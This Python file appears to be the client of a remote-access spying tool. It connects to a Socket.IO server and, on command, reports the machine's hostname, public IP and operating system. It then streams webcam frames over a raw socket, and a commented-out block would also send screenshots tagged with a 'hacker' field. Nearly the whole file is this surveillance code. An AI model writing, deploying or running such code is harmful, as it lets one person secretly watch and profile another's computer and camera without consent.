from copyreg import pickle
import socketio
from requests import get
import socket
import platform
import pyautogui
import numpy as np
import struct
import cv2
import pickle
from time import sleep
import imutils

sio = socketio.Client()

isRemotting = False

cap = cv2.VideoCapture(0)

@sio.event
def connect():
  print("I'm connected!")

@sio.on('info')
def myInfo():
  ip = get("https://api.ipify.org").text

  sio.emit('my info', {
    'name': socket.gethostname(),
    'ip': ip,
    'os': "mac" if platform.system() == "Darwin" else platform.system()
  })

@sio.on('stop remote')
def remoteStop():
  global isRemotting
  isRemotting = False

@sio.on('remote start')
def remoteStart():
  sleep(1)
  global isRemotting
  isRemotting = True

  client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  client_socket.connect(('localhost', 8001))

  cam = cv2.VideoCapture(0)
  img_counter = 0

  #encode to jpeg format
  #encode param image quality 0 to 100. default:95
  #if you want to shrink data size, choose low image quality.
  encode_param=[int(cv2.IMWRITE_JPEG_QUALITY),90]

  while True:
    ret, frame = cam.read()
    frame = imutils.resize(frame, width=320)
    frame = cv2.flip(frame,180)
    result, image = cv2.imencode('.jpg', frame, encode_param)
    data = pickle.dumps(image, 0)
    size = len(data)

    if img_counter%10==0:
      client_socket.sendall(struct.pack(">L", size) + data)
      cv2.imshow('client',frame)
        
    img_counter += 1

    if cv2.waitKey(1) & 0xFF == ord('q'):
      break
  # while isRemotting:
  #   screen = pyautogui.screenshot()
  #   src = np.array(screen)

  #   sio.emit('stream monitor', {'src': src.tolist(), 'hacker': data['hacker']})

if __name__ == '__main__':
  sio.connect('http://localhost:8000')